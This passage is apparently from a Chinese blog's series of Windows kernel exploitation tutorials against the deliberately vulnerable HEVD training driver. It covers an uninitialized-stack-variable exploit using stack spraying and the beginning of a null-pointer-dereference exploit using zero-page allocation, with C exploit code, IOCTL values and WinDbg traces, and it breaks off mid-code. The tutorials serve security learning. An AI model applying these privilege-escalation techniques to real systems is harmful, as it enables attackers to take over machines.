class="line">    UNINITIALIZED_MEMORY_STACK UninitializedMemory;</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="控制码"><a href="#控制码" class="headerlink" title="控制码"></a>控制码</h2><p>我们还是从控制码入手，在<code>HackSysExtremeVulnerableDriver.h</code>中定位到相应的定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    IOCTL(0x80B)</span></span><br></pre></td></tr></table></figure>
<p>然后我们用python计算一下控制码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((<span class="number">0x00000022</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0x00000000</span> &lt;&lt; <span class="number">14</span>) | (<span class="number">0x80b</span> &lt;&lt; <span class="number">2</span>) | <span class="number">0x00000003</span>)</span><br><span class="line"><span class="string">'0x22202f'</span></span><br></pre></td></tr></table></figure>
<p>我们验证一下我们的代码，我们先传入 buf = 0xBAD0B0B0 观察，构造如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Get HANDLE</span></span><br><span class="line">	hDevice = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to get HANDLE...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Success to get HANDLE!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PDWORD32)(buf) = <span class="number">0xBAD0B0B0</span>+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22202f</span>, buf, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (init() == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+]Failed to get HANDLE!!!\n"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Trigger_shellcode();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们打印的信息如下，可以看到对<code>UninitializedStackVariable</code>的一些对象进行了正确的赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******</span><br><span class="line">[+] UserValue: 0xBAD0B0B0</span><br><span class="line">[+] UninitializedStackVariable Address: 0x8E99B9C8</span><br><span class="line">[+] UninitializedStackVariable.Value: 0xBAD0B0B0</span><br><span class="line">[+] UninitializedStackVariable.Callback: 0x8D6A3EE8</span><br><span class="line">[+] Triggering Uninitialized Stack Variable Vulnerability</span><br><span class="line">[+] Uninitialized Stack Variable Object Callback</span><br><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******</span><br></pre></td></tr></table></figure>
<p>我们尝试传入不同的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PDWORD32)(buf) = <span class="number">0xBAD0B0B0</span>+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22202f</span>, buf, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行效果如下，因为有异常处理机制，所以这里并不会蓝屏</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******</span><br><span class="line">[+] UserValue: 0xBAD0B0B1</span><br><span class="line">[+] UninitializedStackVariable Address: 0x97E789C8</span><br><span class="line">[+] UninitializedStackVariable.Value: 0x00000002</span><br><span class="line">[+] UninitializedStackVariable.Callback: 0x00000000</span><br><span class="line">[+] Triggering Uninitialized Stack Variable Vulnerability</span><br><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******</span><br></pre></td></tr></table></figure>
<p>我们在<code>HEVD!TriggerUninitializedStackVariable+0x8c</code>比较处下断点运行查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; u 8D6A3F86</span><br><span class="line">HEVD!TriggerUninitializedStackVariable+0x8c [c:\hacksysextremevulnerabledriver\driver\uninitializedstackvariable.c @ 119]:</span><br><span class="line">8d6a3f86 39bdf8feffff    cmp     dword ptr [ebp-108h],edi</span><br><span class="line">8d6a3f8c 7429            je      HEVD!TriggerUninitializedStackVariable+0xbd (8d6a3fb7)</span><br><span class="line">8d6a3f8e ff95f8feffff    call    dword ptr [ebp-108h]</span><br><span class="line">8d6a3f94 eb21            jmp     HEVD!TriggerUninitializedStackVariable+0xbd (8d6a3fb7)</span><br><span class="line">8d6a3f96 8b45ec          mov     eax,dword ptr [ebp-14h]</span><br><span class="line">8d6a3f99 8b00            mov     eax,dword ptr [eax]</span><br><span class="line">8d6a3f9b 8b00            mov     eax,dword ptr [eax]</span><br><span class="line">8d6a3f9d 8945e4          mov     dword ptr [ebp-1Ch],eax</span><br><span class="line">1: kd&gt; ba e1 8D6A3F86</span><br></pre></td></tr></table></figure>
<p>我们断下来之后用<code>dps esp</code>可以看到我们的 Value 和 Callback ，单步几次观察，可以发现确实已经被SEH异常处理所接手</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******</span><br><span class="line">[+] UserValue: 0xBAD0B0B1</span><br><span class="line">[+] UninitializedStackVariable Address: 0x8FB049C8</span><br><span class="line">[+] UninitializedStackVariable.Value: 0x00000002</span><br><span class="line">[+] UninitializedStackVariable.Callback: 0x00000000</span><br><span class="line">[+] Triggering Uninitialized Stack Variable Vulnerability</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerUninitializedStackVariable+0x8c:</span><br><span class="line">8d6a3f86 39bdf8feffff    cmp     dword ptr [ebp-108h],edi</span><br><span class="line">3: kd&gt; dps esp</span><br><span class="line">8fb049b8  02da71d7</span><br><span class="line">8fb049bc  88b88460</span><br><span class="line">8fb049c0  88b884d0</span><br><span class="line">8fb049c4  8d6a4ca4 HEVD! ?? ::NNGAKEGL::`string&apos;</span><br><span class="line">8fb049c8  00000002 =&gt; UninitializedStackVariable.Value</span><br><span class="line">8fb049cc  00000000 =&gt; UninitializedStackVariable.Callback</span><br><span class="line">8fb049d0  8684e1b8</span><br><span class="line">8fb049d4  00000002</span><br><span class="line">8fb049d8  8fb049e8</span><br><span class="line">8fb049dc  84218ba9 hal!KfLowerIrql+0x61</span><br><span class="line">8fb049e0  00000000</span><br><span class="line">8fb049e4  00000000</span><br><span class="line">8fb049e8  8fb04a20</span><br><span class="line">8fb049ec  83e7f68b nt!KiSwapThread+0x254</span><br><span class="line">8fb049f0  8684e1b8</span><br><span class="line">8fb049f4  83f2ff08 nt!KiInitialPCR+0x3308</span><br><span class="line">8fb049f8  83f2cd20 nt!KiInitialPCR+0x120</span><br><span class="line">8fb049fc  00000001</span><br><span class="line">8fb04a00  00000000</span><br><span class="line">8fb04a04  8684e1b8</span><br><span class="line">8fb04a08  8684e1b8</span><br><span class="line">8fb04a0c  00000f8e</span><br><span class="line">8fb04a10  c0802000</span><br><span class="line">8fb04a14  8fb04a40</span><br><span class="line">8fb04a18  83e66654 nt!MiUpdateWsle+0x231</span><br><span class="line">8fb04a1c  7606a001</span><br><span class="line">8fb04a20  00000322</span><br><span class="line">8fb04a24  00000129</span><br><span class="line">8fb04a28  00000129</span><br><span class="line">8fb04a2c  86c08220</span><br><span class="line">8fb04a30  00000000</span><br><span class="line">8fb04a34  8670f1b8</span><br><span class="line">3: kd&gt; p</span><br><span class="line">HEVD!TriggerUninitializedStackVariable+0xbd:</span><br><span class="line">8d6a3fb7 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh</span><br><span class="line">3: kd&gt; p</span><br><span class="line">HEVD!TriggerUninitializedStackVariable+0xc4:</span><br><span class="line">8d6a3fbe 8bc7            mov     eax,edi</span><br><span class="line">3: kd&gt; p</span><br><span class="line">HEVD!TriggerUninitializedStackVariable+0xc6:</span><br><span class="line">8d6a3fc0 e894c0ffff      call    HEVD!__SEH_epilog4 (8d6a0059)</span><br></pre></td></tr></table></figure>
<h2 id="栈喷射-Stack-Spray"><a href="#栈喷射-Stack-Spray" class="headerlink" title="栈喷射(Stack Spray)"></a>栈喷射(Stack Spray)</h2><p>因为程序中会调用回调函数，所以我们希望的是把回调函数设置为我们shellcode的位置，其实如果这里不对回调函数进行验证是否为0，我们可以考虑直接在0页构造我们的shellcode，但是这里对回调函数进行了限制，就需要换一种思路</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#endif</span><br><span class="line"></span><br><span class="line">        //</span><br><span class="line">        // Call the callback function</span><br><span class="line">        //</span><br><span class="line"></span><br><span class="line">        if (UninitializedMemory.Callback)</span><br><span class="line">        &#123;</span><br><span class="line">            UninitializedMemory.Callback();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>我们需要把回调函数的位置修改成不为0的地址，并且地址指向的是我们的shellcode，这里就需要用到一个新的方法，栈喷射，<a href="https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/" target="_blank" rel="noopener">j00ru师傅的文章</a>很详细的讲解了这个机制，我简单解释一下，我们始终是在用户模式干扰内核模式，首先你需要了解内核栈和用户栈的结构，然后了解下面这个函数是如何进行栈喷射的，函数原型如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COPY_STACK_SIZE             1024</span></span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line"> NtMapUserPhysicalPages (</span><br><span class="line">   __in PVOID VirtualAddress,</span><br><span class="line">   __in ULONG_PTR NumberOfPages,</span><br><span class="line">   __in_ecount_opt(NumberOfPages) PULONG_PTR UserPfnArray</span><br><span class="line"> )</span><br><span class="line">(...)</span><br><span class="line">  ULONG_PTR StackArray[COPY_STACK_SIZE];</span><br></pre></td></tr></table></figure>
<p>因为<code>COPY_STACK_SIZE</code>的大小是1024，函数的栈最大也就 4096byte ，所以我们只需要传 1024 * 4 = 4096 的大小就可以占满一页内存了，当然我们传的都是我们的shellcode的位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PDWORD StackSpray = (PDWORD)<span class="built_in">malloc</span>(<span class="number">1024</span> * <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memset</span>(StackSpray, <span class="number">0x41</span>, <span class="number">1024</span> * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]Spray address is 0x%p\n"</span>, StackSpray);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	*(PDWORD)(StackSpray + i) = (DWORD)&amp; ShellCode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NtMapUserPhysicalPages(<span class="literal">NULL</span>, <span class="number">0x400</span>, StackSpray);</span><br></pre></td></tr></table></figure>
<p>我们来看看我们完整的exp的运行情况，我们还是在刚才的地方下断点，可以清楚的看到我们的shellcode已经被喷上去了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; ba e1 8D6A3F86</span><br><span class="line">0: kd&gt; g</span><br><span class="line">****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******</span><br><span class="line">[+] UserValue: 0xBAD0B0B1</span><br><span class="line">[+] UninitializedStackVariable Address: 0x92E2F9C8</span><br><span class="line">[+] UninitializedStackVariable.Value: 0x00931040</span><br><span class="line">[+] UninitializedStackVariable.Callback: 0x00931040</span><br><span class="line">[+] Triggering Uninitialized Stack Variable Vulnerability</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">8d6a3f86 39bdf8feffff    cmp     dword ptr [ebp-108h],edi</span><br><span class="line">2: kd&gt; dd 0x92E2F9C8</span><br><span class="line">92e2f9c8  00931040 00931040 00931040 00931040</span><br><span class="line">92e2f9d8  00931040 00931040 00931040 00931040</span><br><span class="line">92e2f9e8  00931040 00931040 00931040 00931040</span><br><span class="line">92e2f9f8  00931040 00931040 00931040 00931040</span><br><span class="line">92e2fa08  00931040 00931040 c0802000 92e2fa40</span><br><span class="line">92e2fa18  83e66654 7606a001 00000322 000000da</span><br><span class="line">92e2fa28  000000da 866cc220 00000000 00931040</span><br><span class="line">92e2fa38  00000005 c0802d08 92e2fa74 83e656cc</span><br><span class="line">2: kd&gt; u 00931040</span><br><span class="line">00931040 53              push    ebx</span><br><span class="line">00931041 56              push    esi</span><br><span class="line">00931042 57              push    edi</span><br><span class="line">00931043 60              pushad</span><br><span class="line">00931044 64a124010000    mov     eax,dword ptr fs:[00000124h]</span><br><span class="line">0093104a 8b4050          mov     eax,dword ptr [eax+50h]</span><br><span class="line">0093104d 8bc8            mov     ecx,eax</span><br><span class="line">0093104f ba04000000      mov     edx,4</span><br></pre></td></tr></table></figure>
<p>最后我们整合一下代码就可以提权了，总结一下步骤</p>
<ul>
<li>初始化句柄等结构</li>
<li>将我们准备喷射的栈用Shellcode填满</li>
<li>调用<code>NtMapUserPhysicalPages</code>进行喷射</li>
<li>调用<code>TriggerUninitializedStackVariable</code>函数触发漏洞</li>
<li>调用cmd提权</li>
</ul>
<p>提权效果如下，详细的代码参考<a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/Uninitialized-Stack-Variable/Uninitialized-Stack-Variable/Uninitialized-Stack-Variable.c" target="_blank" rel="noopener">这里</a></p>
<p><img src="/2019/07/28/Windows-Kernel-Exploit-内核漏洞学习-6-Uninitialized-Stack-Variable/test.gif" alt="test"></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>这个漏洞利用的情况比较苛刻，但是挺有意思的，也是第一次见栈喷射，还是从j00ru的文章中学到了许多新奇的东西，多看看国外的文档自己的英语水平也慢慢好起来了</p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(5)-Null-Pointer-Dereference</title>
    <url>/2019/07/28/Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-5-Null-Pointer-Dereference/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这是 Windows kernel exploit 系列的第五部分，前一篇我们讲了池溢出漏洞，这一篇我们讲空指针解引用，这篇和上篇比起来就很简单了，话不多说，进入正题，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><h2 id="空指针解引用"><a href="#空指针解引用" class="headerlink" title="空指针解引用"></a>空指针解引用</h2><p>我们还是先用IDA分析<code>HEVD.sys</code>，大概看一下函数的流程，函数首先验证了我们传入<code>UserBuffer</code>是否在用户模式下，然后申请了一块池，打印了池的一些属性之后判断<code>UserValue</code>是否等于一个数值，相等则打印一些<code>NullPointerDereference</code>的属性，不相等则将它释放并且置为NULL，但是下面没有做任何检验就直接引用了<code>NullPointerDereference-&gt;Callback();</code>这显然是不行，的当一个指针的值为空时，却被调用指向某一块内存地址时，就产生了空指针引用漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TriggerNullPointerDereference</span><span class="params">(<span class="keyword">void</span> *UserBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PNULL_POINTER_DEREFERENCE NullPointerDereference; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> UserValue; <span class="comment">// [esp+3Ch] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">8u</span>, <span class="number">4u</span>);</span><br><span class="line">  NullPointerDereference = (PNULL_POINTER_DEREFERENCE)ExAllocatePoolWithTag(<span class="number">0</span>, <span class="number">8u</span>, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( NullPointerDereference )</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Tag: %s\n"</span>, <span class="string">"'kcaH'"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Type: %s\n"</span>, <span class="string">"NonPagedPool"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Size: 0x%X\n"</span>, <span class="number">8</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Chunk: 0x%p\n"</span>, NullPointerDereference);</span><br><span class="line">    UserValue = *(_DWORD *)UserBuffer;</span><br><span class="line">    DbgPrint(<span class="string">"[+] UserValue: 0x%p\n"</span>, UserValue);</span><br><span class="line">    DbgPrint(<span class="string">"[+] NullPointerDereference: 0x%p\n"</span>, NullPointerDereference);</span><br><span class="line">    <span class="keyword">if</span> ( UserValue == <span class="number">0xBAD0B0B0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      NullPointerDereference-&gt;Value = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">      NullPointerDereference-&gt;Callback = (<span class="keyword">void</span> (__stdcall *)())NullPointerDereferenceObjectCallback;</span><br><span class="line">      DbgPrint(<span class="string">"[+] NullPointerDereference-&gt;Value: 0x%p\n"</span>, NullPointerDereference-&gt;Value);</span><br><span class="line">      DbgPrint(<span class="string">"[+] NullPointerDereference-&gt;Callback: 0x%p\n"</span>, NullPointerDereference-&gt;Callback);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrint(<span class="string">"[+] Freeing NullPointerDereference Object\n"</span>);</span><br><span class="line">      DbgPrint(<span class="string">"[+] Pool Tag: %s\n"</span>, <span class="string">"'kcaH'"</span>);</span><br><span class="line">      DbgPrint(<span class="string">"[+] Pool Chunk: 0x%p\n"</span>, NullPointerDereference);</span><br><span class="line">      ExFreePoolWithTag(NullPointerDereference, <span class="number">0x6B636148</span>u);</span><br><span class="line">      NullPointerDereference = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DbgPrint(<span class="string">"[+] Triggering Null Pointer Dereference\n"</span>);</span><br><span class="line">    NullPointerDereference-&gt;Callback();</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">"[-] Unable to allocate Pool chunk\n"</span>);</span><br><span class="line">    result = <span class="number">0xC0000017</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们从源码<code>NullPointerDereference.c</code>查看一下防护措施，安全的操作对<code>NullPointerDereference</code>是否为NULL进行了检验，其实我们可以联想到上一篇的内容，既然是要引用0页内存，那都不用我们自己写触发了，直接构造好0页内存调用这个问题函数就行了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is checking if</span></span><br><span class="line">        <span class="comment">// 'NullPointerDereference' is not NULL before calling the callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (NullPointerDereference)</span><br><span class="line">        &#123;</span><br><span class="line">            NullPointerDereference-&gt;Callback();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Null Pointer Dereference\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is not validating if 'NullPointerDereference' is NULL</span></span><br><span class="line">        <span class="comment">// before calling the callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        NullPointerDereference-&gt;Callback();</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="控制码"><a href="#控制码" class="headerlink" title="控制码"></a>控制码</h2><p>我们还是从控制码入手，在<code>HackSysExtremeVulnerableDriver.h</code>中定位到相应的定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEVD_IOCTL_NULL_POINTER_DEREFERENCE                      IOCTL(0x80A)</span></span><br></pre></td></tr></table></figure>
<p>然后我们用python计算一下控制码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((<span class="number">0x00000022</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0x00000000</span> &lt;&lt; <span class="number">14</span>) | (<span class="number">0x80A</span> &lt;&lt; <span class="number">2</span>) | <span class="number">0x00000003</span>)</span><br><span class="line"><span class="string">'0x22202b'</span></span><br></pre></td></tr></table></figure>
<p>我们验证一下我们的代码，我们先传入 buf = 0xBAD0B0B0 观察，构造如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Get HANDLE</span></span><br><span class="line">	hDevice = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to get HANDLE...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Success to get HANDLE!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PDWORD32)(buf) = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22202b</span>, buf, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (init() == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+]Failed to get HANDLE!!!\n"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Trigger_shellcode();</span><br><span class="line">	<span class="comment">//__debugbreak();</span></span><br><span class="line">	</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如我们所愿，这里因为 UserValue = 0xBAD0B0B0 所以打印了<code>NullPointerDereference</code>的一些信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ******</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x8</span><br><span class="line">[+] Pool Chunk: 0x877B5E68</span><br><span class="line">[+] UserValue: 0xBAD0B0B0</span><br><span class="line">[+] NullPointerDereference: 0x877B5E68</span><br><span class="line">[+] NullPointerDereference-&gt;Value: 0xBAD0B0B0</span><br><span class="line">[+] NullPointerDereference-&gt;Callback: 0x8D6A3BCE</span><br><span class="line">[+] Triggering Null Pointer Dereference</span><br><span class="line">[+] Null Pointer Dereference Object Callback</span><br><span class="line">****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ******</span><br></pre></td></tr></table></figure>
<h2 id="零页的构造"><a href="#零页的构造" class="headerlink" title="零页的构造"></a>零页的构造</h2><p>我们还是用前面的方法申请到零页内存，只是我们这里需要修改shellcode指针放置的位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PVOID Zero_addr = (PVOID)<span class="number">1</span>;</span><br><span class="line">SIZE_T RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]Started to alloc zero page...\n"</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(NtAllocateVirtualMemory(</span><br><span class="line">	INVALID_HANDLE_VALUE,</span><br><span class="line">	&amp;Zero_addr,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	&amp;RegionSize,</span><br><span class="line">	MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">	PAGE_READWRITE)) || Zero_addr != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Failed to alloc zero page!\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span 